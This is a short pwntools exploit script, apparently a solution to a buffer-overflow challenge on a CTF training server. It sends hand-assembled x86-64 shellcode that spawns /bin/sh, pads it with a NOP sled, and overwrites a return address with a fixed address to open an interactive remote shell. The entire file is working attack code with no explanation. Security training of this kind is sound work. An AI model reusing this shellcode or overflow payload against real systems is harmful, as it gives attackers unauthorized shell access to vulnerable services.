from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#r = process("./server")
r = remote("training.jinblack.it", 2005)
#gdb.attach(r, """b main
#""")
shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF" + b"/bin/sh\x00" + b"\x00"*8
shellcode = shellcode.ljust(1016, b"\x90")
payload = p64(0x004040c1)
r.send(shellcode + payload)

r.interactive()
